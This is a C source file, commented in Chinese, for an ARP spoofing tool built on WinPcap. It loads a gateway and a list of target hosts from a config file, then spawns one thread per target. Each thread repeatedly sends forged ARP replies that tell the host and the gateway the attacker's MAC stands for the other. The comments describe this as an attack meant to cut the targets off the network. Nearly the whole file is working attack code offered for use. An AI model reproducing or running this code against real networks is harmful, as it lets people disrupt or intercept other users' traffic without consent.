#include "ArpCheater.h"

/*
	VS中的正则:
	使用场景:将单行的多行注释改为单行注释
		1.使用分组将注释中的内容捕获下来,对内容使用()即可..
			/\*(.*)\* /
		2.引用组的内容,\或$(VS中),将原注释内容添加到新的单行注释里,
			//$1
*/

pcap_t *deviceHandler;
pcap_addr_t *pAddress; //网卡地址 
//发送将其强转为字符类型即可,(unsigned char*)&gatewayToHostPacket
ArpDatagram gatewayToHostPacket; //网关到主机ARP包
ArpDatagram hostToGatewayPacket; //主机到网关ARP包
unsigned long localIp; //本机IP地址 
unsigned long netmask; //子网掩码
unsigned char *localMac; //本机MAC地址 
int hostNumber;//需要攻击的主机数量
int attackCount;//需要攻击的次数
unsigned long gatewayIP; //网关IP
unsigned char gatewayMac[6]; //网关MAC
unsigned long *fakeIps; //要伪装成的IP地址列表
//需要攻击的主机MAC地址列表,其数量未知,暂时用数组指针表示
unsigned char (*attackHostMacs)[6];

int main() {
	loadConfig();
	showConfig();
	
	pcap_if_t *allDevices; //所有网卡
	pcap_if_t *device; //某网卡
	int deviceCount = 0; //网卡计数
	int deviceNumber = 0; //选择的指定的网卡序号

	char errorBuffer[PCAP_ERRBUF_SIZE]; //错误信息缓冲

	//获取所有网卡列表
	int findResult = pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &allDevices, errorBuffer);
	if (-1 == findResult)
	{
		free(allDevices);
		allDevices = NULL;
		fprintf(stderr, "%s\n", errorBuffer);
		exit(1);
	}

	for (device = allDevices; NULL != device; device = device->next) {
		printf("%d: %s", ++deviceCount, device->name);
		if (NULL == device->description) {
			printf("(No device available!)\n");
		}
		else
		{
			printf("(%s)\n", device->description);
		}
	}
	//选择一张网卡进行工作
	printf("Enter the interface number(1 - %d):", deviceCount);
	scanf("%d", &deviceNumber);
	//如果用户选择的网卡序号超出有效范围，则退出 
	if (deviceNumber > deviceCount || deviceNumber < 1) {
		printf("Interface number out of range!");
		//释放设备列表
		pcap_freealldevs(allDevices);
		return -1;
	}
	//跳到指定网卡
	for (device = allDevices, deviceCount = 0; deviceCount < deviceNumber - 1; deviceCount++, device = device->next);

	//获取本机MAC
	localMac = getLocalMac(device->name);
	//Debug
	localMac[0] = 0x011;

	//打开网卡
	deviceHandler = pcap_open(device->name, 65535, PCAP_OPENFLAG_PROMISCUOUS, 1000, NULL, errorBuffer);

	if (NULL == deviceHandler)
	{
		fprintf(stderr, "\nUnable to open the adapter, %s is not supported by WinPcap.\n", device->name);
		pcap_freealldevs(allDevices);
		return -1;
	}

	//获取指定设备的ip和子网掩码,并判断与网关是否在同一网段
	int isSameNetworkSegment = FALSE;
	for (pAddress = device->addresses; NULL != pAddress; pAddress = pAddress->next) {
		localIp = ((struct sockaddr_in*)pAddress->addr)->sin_addr.s_addr;
		netmask = ((struct sockaddr_in *)pAddress->netmask)->sin_addr.s_addr;
		if (0 == localIp || 0 == netmask) {
			continue;
		}


		//判断本机ip是否和指定网关在同一网段
		if ((localIp & netmask) != (gatewayIP & netmask)) {
			//如果不在一个子网，继续遍历地址列表
			continue;
		}
		isSameNetworkSegment = TRUE;
		//根据读取出来的目标主机发送数据包进行arp断网攻击
		for (int i = 0; i < hostNumber; i++)
		{
			//判断本机ip是否和指定主机IP在同一网段,如果不在一个子网，则跳过
			if ((localIp & netmask) == (fakeIps[i] & netmask)) {
				//sendAttackPacket(fakeIps[i], *(attackHostMacs + i));
				//TODO
				//在这里添加一个多线程即可,单线程同时只能对某台主机进行断网攻击
				AttackHost *host = calloc(1, sizeof(AttackHost));
				host->ip = fakeIps[i];
				host->mac = *(attackHostMacs + i);
				_beginthread(sendAttackPacket, 0, (void *)host);
			}
		}
		
		/*
			//获取网络主机数
			unsigned long hostSize = ntohl(~netmask);
			//获取子网地址
			unsigned long net = localIp & netmask;
		*/
	}

	if (FALSE == isSameNetworkSegment)
	{
		printf("配置信息有误,本机与指定网关不在同一网段,请检查!\n");
	}

	system("pause");
	free(fakeIps);
	free(attackHostMacs);
	return 0;
}

/*
	指定IP发送数据包,让主机断网的步骤:
		1.模拟路由发送arp应答包到主机(源地址:路由IP+本机MAC,目标地址:被攻击主机IP+被攻击主机MAC)
		2.模拟主机发送arp应答包到路由(源地址:被攻击主机IP+本机MAC,目标地址:路由IP+路由MAC)
*/
//void sendAttackPacket(unsigned long hostIP,unsigned char *hostMac) {
void sendAttackPacket(void *p) {
	AttackHost *host = (AttackHost *)p;
	unsigned long hostIP = host->ip;
	unsigned char *hostMac = host->mac;
	unsigned long IPs[2] = { gatewayIP, hostIP };
	unsigned char *Macs[2] = { gatewayMac , hostMac};
	for (int i = 0, j = 1; i < 2; i++, j--)
	{
		//构造假的arp应答包,达到本机伪装成给定的IPs地址的目的
		if (i == 0)
		{
			buildArpReplyDatagram(&gatewayToHostPacket, localMac, IPs[i], IPs[j], Macs[j]);
		}
		else {
			buildArpReplyDatagram(&hostToGatewayPacket ,localMac, IPs[i], IPs[j], Macs[j]);
		}
	}

	//发送数据包
	for (int k = 0; k < attackCount; k++)
	{
		int sendResult = pcap_sendpacket(deviceHandler, (unsigned char*)&gatewayToHostPacket, 60);
		showResult(sendResult, IPs, Macs, 0, 1);
		sendResult = pcap_sendpacket(deviceHandler, (unsigned char*)&hostToGatewayPacket, 60);
		showResult(sendResult, IPs, Macs, 1, 0);
		Sleep(10);
	}
	free(p);
	_endthread();
}
/*
	显示结果
*/
void showResult(int sendResult, unsigned long *IPs, unsigned char **Macs, int i, int j) {
	if (sendResult == -1)
	{
		fprintf(stderr, "pcap_sendpacket error.\n");
	}
	else {
		unsigned char *senderIP = (unsigned char*)&IPs[i];
		unsigned char *receiverIP = (unsigned char*)&IPs[j];
		if (i == 0) {
			printf("路由->主机:\n");
			printf("source IPs:%d.%d.%d.%d -- source mac:%02X-%02X-%02X-%02X-%02X-%02X\n",
				senderIP[0], senderIP[1], senderIP[2], senderIP[3],
				localMac[0], localMac[1], localMac[2], localMac[3], localMac[4], localMac[5]
			);
			printf("destination IPs:%d.%d.%d.%d -- destination mac:%02X-%02X-%02X-%02X-%02X-%02X\n",
				receiverIP[0], receiverIP[1], receiverIP[2], receiverIP[3],
				Macs[j][0], Macs[j][1], Macs[j][2], Macs[j][3], Macs[j][4], Macs[j][5]
			);
		}
		else {
			printf("主机->路由:\n");
			printf("source IPs:%d.%d.%d.%d -- source mac:%02X-%02X-%02X-%02X-%02X-%02X\n",
				senderIP[0], senderIP[1], senderIP[2], senderIP[3],
				localMac[0], localMac[1], localMac[2], localMac[3], localMac[4], localMac[5]
			);
			printf("destination IPs:%d.%d.%d.%d -- destination mac:%02X-%02X-%02X-%02X-%02X-%02X\n",
				receiverIP[0], receiverIP[1], receiverIP[2], receiverIP[3],
				Macs[j][0], Macs[j][1], Macs[j][2], Macs[j][3], Macs[j][4], Macs[j][5]
			);
		}
	}
}
/*
	获取本机MAC
	@param deviceName 指定进行工作的网卡设备名称
*/
unsigned char* getLocalMac(char* deviceName) {
	//+8以去掉"rpcap://"
	deviceName = deviceName + 8;
	static u_char mac[6];
	memset(mac, 0, sizeof(mac));
	LPADAPTER adapter = PacketOpenAdapter(deviceName);
	if (NULL == adapter || (adapter->hFile) == INVALID_HANDLE_VALUE)
	{
		return NULL;
	}
	PPACKET_OID_DATA oidData = (PPACKET_OID_DATA)malloc(6 + sizeof(PACKET_OID_DATA));
	if (NULL == oidData)
	{
		PacketCloseAdapter(adapter);
		return NULL;
	}
	//Retrieve the adapter MAC querying the NIC driver 
	oidData->Oid = OID_802_3_CURRENT_ADDRESS;
	oidData->Length = 6;
	memset(oidData->Data, 0, 6);
	int status = PacketRequest(adapter, FALSE, oidData);
	if (TRUE == status)
	{
		memcpy(mac, (u_char *)(oidData->Data), 6);
	}

	free(oidData);
	oidData = NULL;
	PacketCloseAdapter(adapter);
	return mac;
}

/*
	封装ARP协议应答包
	@param packet 需要构造的应答包
	@param sourceMac 源MAC
	@param sourceIP 源IP
	@param destinationIP 目标IP
*/
void buildArpReplyDatagram(ArpDatagram *packet, unsigned char* sourceMac, unsigned long sourceIP,
	unsigned long destinationIP, unsigned char* destinationMac) {

	//ARP请求包目的MAC地址是广播地址:FF-FF-FF-FF-FF-FF
	//memset(packet.ethnetFrame.destinationMac, 0xFF, 6);
	memcpy(packet->ethnetFrame.destinationMac, destinationMac, 6);
	//源MAC地址
	memcpy(packet->ethnetFrame.sourceMAC, sourceMac, 6);
	//帧类型 ARP:0X806
	packet->ethnetFrame.frameType = htons(0x0806);

	//硬件类型 Ethernet是0x0001 
	packet->arpDatagram.hardwareType = htons(0x01);

	//要映射的协议地址类型 IP 0x8000
	packet->arpDatagram.protocolType = htons(0x0800);
	//硬件地址长度 MAC地址为6
	packet->arpDatagram.hardwareAddressLength = 0x06;
	//协议地址长度 IP地址为4
	packet->arpDatagram.protocolAddressLength = 0x04;
	//操作类型 ARP请求为1,应答为2
	packet->arpDatagram.operationType = htons(0x02);
	//源MAC地址
	memcpy(packet->arpDatagram.senderMac, sourceMac, 6);
	//源IP地址
	packet->arpDatagram.senderIP = sourceIP;
	//目标MAC地址
	memcpy(packet->arpDatagram.receiverMac, destinationMac, 6);
	//目标IP地址
	packet->arpDatagram.receiverIP = destinationIP;
	//填充数据 18Bytes
	memset(packet->arpDatagram.padding, 0, sizeof(packet->arpDatagram.padding));
}

/*
	初始化变量
*/
void init() {
	fakeIps = (unsigned long *)calloc(hostNumber, sizeof(unsigned long));
	attackHostMacs = (unsigned char (*)[6])calloc(hostNumber, sizeof(char) * 6);
}

/*
	加载配置文件并初始化其内容
	功能 : 获得当前工作目录.
	char* _getcwd(char *buffer, int maxlen);
*/
void loadConfig() {
	char buffer[300] = { 0 };
	printf("当前路径:%s\n", _getcwd(buffer, 300));

	FILE *config = fopen("./config.txt", "r");
	if (config == NULL)
	{
		fprintf(stderr, "当前路径中不存在config.txt配置文件,请检查!\n");
		fclose(config);
		config = NULL;
		exit(-1);
	}
	//指明有内容的行是存放的IP还是MAC,1表示IP,2表示MAC
	int contentIndicator = 0;
	//当前读取的主机序号
	int hostId = 0;
	int i = 0;
	while (!feof(config))
	{
		fgets(buffer, 300, config);

		if (buffer[0] == '#')
		{
			continue;
		}
		else if (TRUE == isSpaceLine(buffer)) {
			//在空行时,重置其为IP
			contentIndicator = INDICATOR_IP;
			continue;
		}
		else if (strstr(buffer, HOST_NUMBER) != NULL)
		{
			sscanf(buffer, "hostNumber=%d", &hostNumber);
			//读取到主机数量就可以开始初始化了
			init();
		}
		else if (strstr(buffer, ATTACK_COUNT) != NULL)
		{
			//读取攻击次数
			sscanf(buffer, "attackCount=%d", &attackCount);
		}
		else
		{
			//读取网关的IP和MAC,网关占了一个,加1比对
			if (hostNumber + 1 > hostId) {
				if (hostId == 0)
				{
					hostId = loadIPOrMac(buffer, contentIndicator, &gatewayIP, gatewayMac, hostId);
				}
				else {
					hostId = loadIPOrMac(buffer, contentIndicator, &fakeIps[hostId - 1], attackHostMacs[hostId - 1], hostId);
				}
			}
			contentIndicator++;
		}
	}

	fclose(config);
	config = NULL;
}

/*
读取IP或MAC
*/
int loadIPOrMac(char *buffer, int contentIndicator, unsigned long *ip, unsigned char *mac, int hostId) {
	if (contentIndicator == INDICATOR_IP)
	{
		(*ip) = inet_addr(buffer);
	}
	else if (contentIndicator == INDICATOR_MAC) {
		sscanf(buffer, "%hhX-%hhX-%hhX-%hhX-%hhX-%hhX",
			&mac[0], &mac[1], &mac[2],
			&mac[3], &mac[4], &mac[5]);
		//读取完MAC之后该主机所有内容才算读取完毕
		hostId++;
	}
	return hostId;
}

/*
判断当前行是否为空行,fgets读取空行会返回'\n',所以判断方法如下:
1.如果以'\n'开始,则是空行
2.如果遇到'\n'之前的所有字符都为' '空格,也是空行
*/
int isSpaceLine(char *buffer) {
	if (buffer == NULL)
	{
		return TRUE;
	}
	if (buffer[0] == '\n') {
		return TRUE;
	}
	for (int i = 0; buffer[i] != '\n'; i++)
	{
		if (buffer[i] != ' ')
		{
			return FALSE;
		}
	}
	return TRUE;
}

/*
显示读取到的网关和主机的IP和MAC
*/
void showConfig() {
	printf("网关IP和MAC:\n");
	unsigned char *ip = (unsigned char*)&gatewayIP;
	printf("%d.%d.%d.%d\n", ip[0], ip[1], ip[2], ip[3]);
	printf("%02X-%02X-%02X-%02X-%02X-%02X\n",
		gatewayMac[0], gatewayMac[1], gatewayMac[2],
		gatewayMac[3], gatewayMac[4], gatewayMac[5]);
	for (int i = 0; i < hostNumber; i++)
	{
		printf("主机IP和MAC:\n");
		unsigned char *ip = (unsigned char*)&fakeIps[i];
		printf("%d.%d.%d.%d\n", ip[0], ip[1], ip[2], ip[3]);
		printf("%02X-%02X-%02X-%02X-%02X-%02X\n",
			attackHostMacs[i][0], attackHostMacs[i][1], attackHostMacs[i][2],
			attackHostMacs[i][3], attackHostMacs[i][4], attackHostMacs[i][5]);
	}
	printf("\n");
}